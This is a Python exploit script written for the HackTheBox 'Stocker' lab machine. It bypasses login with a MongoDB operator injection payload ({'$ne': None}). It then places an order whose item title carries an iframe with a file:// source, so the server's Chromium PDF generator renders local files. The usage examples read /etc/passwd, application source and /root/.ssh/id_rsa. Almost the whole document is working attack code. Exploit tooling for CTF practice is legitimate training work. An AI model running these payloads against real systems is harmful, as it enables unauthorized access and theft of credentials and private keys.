#!/usr/bin/env python3
"""
stocker.py — LFI via HTML Injection in Chromium PDF Generator
CVE: N/A — Logic vulnerability (NoSQLi auth bypass + Server-Side HTML Injection)

Affected app : Stocker (HackTheBox)
Vulnerability: MongoDB NoSQLi bypass → authenticated HTML injection in PDF
               generator renders local files via file:// protocol (LFI)

Usage:
  python3 stocker.py --url http://dev.stocker.htb --path /etc/passwd
  python3 stocker.py --url http://dev.stocker.htb --path /var/www/dev/index.js
  python3 stocker.py --url http://dev.stocker.htb --path /root/.ssh/id_rsa --delay 8

Author : @gugeldot
"""

import argparse
import json
import os
import sys
import tempfile
import time
import uuid
import webbrowser

import requests

# ── ANSI colors ────────────────────────────────────────────────────────────────
R    = "\033[91m"
G    = "\033[92m"
Y    = "\033[93m"
B    = "\033[94m"
M    = "\033[95m"
C    = "\033[96m"
DIM  = "\033[2m"
RST  = "\033[0m"
BOLD = "\033[1m"

BANNER = f"""{C}{BOLD}
  ███████╗████████╗ ██████╗  ██████╗██╗  ██╗███████╗██████╗
  ██╔════╝╚══██╔══╝██╔═══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
  ███████╗   ██║   ██║   ██║██║     █████╔╝ █████╗  ██████╔╝
  ╚════██║   ██║   ██║   ██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
  ███████║   ██║   ╚██████╔╝╚██████╗██║  ██╗███████╗██║  ██║
  ╚══════╝   ╚═╝    ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
{RST}{DIM}  LFI via HTML Injection → Chromium PDF Generator{RST}
{DIM}  NoSQLi Auth Bypass + file:// SSRF in PDF renderer{RST}
{DIM}  Designed for HackTheBox Stocker Machine By Gugeldot{RST}
"""

def info(msg):    print(f"  {B}[*]{RST} {msg}")
def success(msg): print(f"  {G}[+]{RST} {msg}")
def error(msg):   print(f"  {R}[-]{RST} {msg}")
def warn(msg):    print(f"  {Y}[!]{RST} {msg}")
def section(msg): print(f"\n{M}{BOLD}══ {msg} ══{RST}")


# ── Phase 1: NoSQLi auth bypass ───────────────────────────────────────────────
def login(session: requests.Session, base_url: str) -> None:
    section("Phase 1 — Authentication (NoSQLi bypass)")
    url     = f"{base_url}/login"
    payload = {"username": {"$ne": None}, "password": {"$ne": None}}

    info(f"Endpoint : POST {url}")
    info(f"Technique: MongoDB operator injection ($ne)")
    info(f"Payload  : {json.dumps(payload)}")

    try:
        r = session.post(
            url, json=payload,
            headers={"Content-Type": "application/json"},
            allow_redirects=False,
            timeout=10
        )
    except requests.exceptions.ConnectionError:
        error(f"Cannot connect to {base_url}")
        sys.exit(1)

    info(f"Response : HTTP {r.status_code}")

    if r.status_code in (200, 302):
        success(f"Auth bypass successful → {r.headers.get('Location', '/stock')}")
    else:
        error(f"Auth failed (HTTP {r.status_code}) — check URL or app state")
        sys.exit(1)


# ── Phase 2: Inject LFI payload via basket title ──────────────────────────────
def place_order(session: requests.Session, base_url: str, file_path: str) -> str:
    section("Phase 2 — Injecting LFI payload")
    url    = f"{base_url}/api/order"
    iframe = (
        f"<iframe src='file://{file_path}' "
        f"width='1000' height='1200'></iframe>"
    )

    info(f"Target file : {file_path}")
    info(f"Vector      : iframe src=file:// in 'title' field")
    info(f"Payload     : {iframe}")

    # Basket items — only the last one carries the payload
    basket = [
        {
            "_id": "638f116eeb060210cbd83a8d",
            "title": iframe,
            "description": "lfi",
            "image": "red-cup.jpg",
            "price": 0,
            "currentStock": 99,
            "__v": 0,
            "amount": 1
        }
    ]

    info(f"POST → {url}")
    r = session.post(
        url,
        json={"basket": basket},
        headers={"Content-Type": "application/json"},
        timeout=10
    )
    info(f"Response : HTTP {r.status_code} | {len(r.content)} bytes")

    try:
        data = r.json()
    except Exception:
        error("Non-JSON response from /api/order")
        error(r.text[:300])
        sys.exit(1)

    if not data.get("success"):
        error(f"Order rejected: {data}")
        sys.exit(1)

    order_id = data["orderId"]
    success(f"Order created → orderId: {C}{order_id}{RST}")
    return order_id


# ── Phase 3: Retrieve rendered PDF ────────────────────────────────────────────
def fetch_pdf(session: requests.Session, base_url: str, order_id: str, delay: int) -> bytes:
    section("Phase 3 — Fetching rendered PDF")
    url = f"{base_url}/api/po/{order_id}"

    if delay > 0:
        info(f"Waiting {delay}s for Chromium to render...")
        time.sleep(delay)

    info(f"GET → {url}")
    try:
        r = session.get(url, timeout=90)
    except requests.exceptions.ReadTimeout:
        error("Timeout waiting for PDF — try increasing --delay")
        sys.exit(1)

    info(f"Response     : HTTP {r.status_code}")
    info(f"Content-Type : {r.headers.get('Content-Type', '?')}")
    info(f"Size         : {len(r.content)} bytes")

    if r.status_code != 200 or "pdf" not in r.headers.get("Content-Type", ""):
        error("Did not receive a valid PDF")
        error(r.text[:300])
        sys.exit(1)

    success(f"PDF received ({len(r.content)} bytes)")
    return r.content


# ── Phase 4: Save PDF to /tmp ──────────────────────────────────────────────────
def save_pdf(content: bytes) -> str:
    section("Phase 4 — Saving PDF")
    filepath = os.path.join(tempfile.gettempdir(), f"{uuid.uuid4().hex}.pdf")

    with open(filepath, "wb") as f:
        f.write(content)

    success(f"Saved → {G}{filepath}{RST}")
    return filepath


# ── Main ───────────────────────────────────────────────────────────────────────
def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="Stocker LFI — NoSQLi bypass + HTML injection in PDF generator",
        epilog="Example: python3 stocker.py --url http://dev.stocker.htb --path /etc/passwd"
    )
    parser.add_argument("--url",   required=True, help="Target base URL (e.g. http://dev.stocker.htb)")
    parser.add_argument("--path",  required=True, help="Absolute path to read (e.g. /etc/passwd)")
    parser.add_argument("--delay", type=int, default=3,
                        help="Seconds to wait for PDF render (default: 3)")
    parser.add_argument("--open-pdf", required=True, type=lambda x: x.lower() == "true", metavar="true|false", help="Auto-open PDF after download (true/false)")
    args = parser.parse_args()

    base_url  = args.url.rstrip("/")
    file_path = args.path

    print(f"  {DIM}URL  : {base_url}{RST}")
    print(f"  {DIM}File : {file_path}{RST}")
    print(f"  {DIM}Delay: {args.delay}s{RST}")

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"})

    login(session, base_url)
    order_id = place_order(session, base_url, file_path)
    pdf_bytes = fetch_pdf(session, base_url, order_id, args.delay)
    pdf_path  = save_pdf(pdf_bytes)

    print()
    
    if args.open_pdf:
        webbrowser.open(f"file://{pdf_path}")
        success("Opened.")
    else:
        info(f"PDF at: {pdf_path}")

    print()


if __name__ == "__main__":
    main()
